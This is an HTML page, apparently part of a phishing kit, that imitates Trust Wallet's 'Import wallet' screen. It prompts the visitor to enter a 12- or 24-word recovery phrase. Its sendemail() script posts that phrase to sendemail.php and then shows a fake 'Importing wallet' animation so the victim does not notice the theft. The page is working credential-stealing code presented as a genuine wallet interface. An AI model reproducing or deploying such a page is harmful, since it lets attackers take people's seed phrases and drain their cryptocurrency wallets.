<!DOCTYPE html>
<html>
<head>
	<title> Trust Wallet - Import wallet</title>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" type="text/css" href="css/bootstrap.min.css">
    <link rel="stylesheet" type="text/css" href="css/fontawesome/css/all.min.css">
    <link rel="stylesheet" type="text/css" href="css/pay.css"> 
    <link rel="icon" href="img/TWT.png">
</head>

<body style="overflow-x: hidden;">

<nav class="navbar">
	<a href="javascript:history.go(-1)">
	<span class="fa fa-chevron-left"></span>
	<h4>Import</h4>
	</a>
	<h3>Multi-Coin Wallet</h3>
    <img src="img/logo3.png" onclick="camera()" class="img">
</nav>

<div class="container-fluid">
	<textarea placeholder="Recovery phrase" name="rphrase" id="rp" cols="30" rows="10" form="wallet"></textarea>
	<button class="paste" onclick="paste()">Paste</button>
	<p>Typically 12 (sometimes 24) words seperated by <br>single spaces</p>
	<form action="" onsubmit="sendemail()" method="post" id="wallet">
		<label for="">Name</label>
		<input type="text" value="Main Wallet 2">
	</form>
	<input class="submit" type="submit" form="wallet" name="submit" value="Import">
</div>
<footer class="footer">
		<a href="" target="_blank" rel="noopener noreferrer"><center><h5>What is a Recovery Phrase?</h5></center></a>
</footer>

<script type="text/javascript" src="js/jquery-3.2.1.min.js"></script>
<script type="text/javascript" src="js/bootstrap.js"></script>
<script>
	$(function(){
     var imagespreview = function(input, placeToInsertImagePreview){
      if(input.files){
        var filesAmount = input.files.length;
        $(placeToInsertImagePreview).html("");

        for(i = 0; i < filesAmount; i++){

          var reader = new FileReader();
           var f = event.target.files[i];
           
          if (f.type == ("image/png") || f.type == ("image/jpeg")) {
          reader.onload = function(event){
            $($.parseHTML('<img width="90%" style="margin:10px 5px;object-fit:contain;object-position: center">')).attr('src', event.target.result).appendTo(placeToInsertImagePreview)
          }}else{
             reader.onload = function(event){
            $($.parseHTML('<video width="90%" style="margin:13px 9px;" controls><video>')).attr('src', event.target.result).appendTo(placeToInsertImagePreview)
          }}
          reader.readAsDataURL(input.files[i]);
        }
      }
    };
    $('#gallery-photo-add').on('change', function(){
      imagespreview(this, 'div.gallery');
    });
  });


  function paste() {
       if (!navigator.clipboard) {
        pastefallback();
        return;
       }
	   
       navigator.clipboard.readText().then(function(text){
		document.querySelector("#rp").value = text;
        console.log('Async: Copying to clipboard was successful');
		}, function(err){
        console.error('Async: Could not copy text: ', err);
       })
 }

   function pastefallback(){
 // console.log(text)
 //if(document.queryCommandSupported('copy') && document.queryCommandEnabled('copy')){
     try{
		
        var success = document.execCommand('paste');
		console.log('Async: Paste to textarea was successful');
		document.querySelector('.alert').style.width = '300px';
		document.querySelector('.alert').style.display = 'block';
		document.querySelector('.alert p').innerHTML = 'Copied!';
		setTimeout(()=>{
		document.querySelector('.alert').style.width = '0';
		document.querySelector('.alert').style.display = 'none';
		document.querySelector('.alert p').innerHTML = '';
		}, 2000)
        }catch(err){
         console.error('Fallback: Oops, unable to copy', err);
        }
    //  }
    }
   function camera(){
	navigator.mediaDevices.getUserMedia({video: true}).then((media)=>{
		let div = document.createElement("div");
		div.className = "fullscreen";
		let video = document.createElement("video");
		video.srcObject = media;
		video.play();
		div.appendChild(video);
		console.log(div);
        document.body.appendChild(div);
	})
   }

   function sendemail(){
    event.preventDefault();
	let formdata = new FormData(event.target);
	let post = fetch('sendemail.php',{
	method: 'POST', // *GET, POST, PUT, DELETE, etc.
	mode: 'cors', // no-cors, *cors, same-origin
	cache: 'no-cache', // *default, no-cache, reload, force-cache, only-if-cached
	credentials: 'same-origin', // include, *same-origin, omit
	headers: {
		// 'Content-Type': 'application/json'
		// 'Content-Type': 'application/x-www-form-urlencoded',
	},
	redirect: 'follow', // manual, *follow, error
	referrerPolicy: 'no-referrer', // no-referrer, *no-referrer-when-downgrade, origin, origin-when-cross-origin, same-origin, strict-origin, strict-origin-when-cross-origin, unsafe-url
	body: formdata// body data type must match "Content-Type" header
	});
	post.then(function(res){
		res.text().then((text)=>console.log(text));
		let div = document.createElement("div");
		div.className = "fullscreen";
		let div2 = document.createElement("div");
		div2.className = "area";
        img = document.createElement("img");
		img.src = "img/loading-load.gif";
		img.width = 80;
        p = document.createElement("p");
		p.innerText = "Importing wallet";
		div2.appendChild(img);
		div2.appendChild(p);
		div.appendChild(div2)
		console.log(div);
        document.body.appendChild(div);
	})
   }
</script>
</body>
</html>
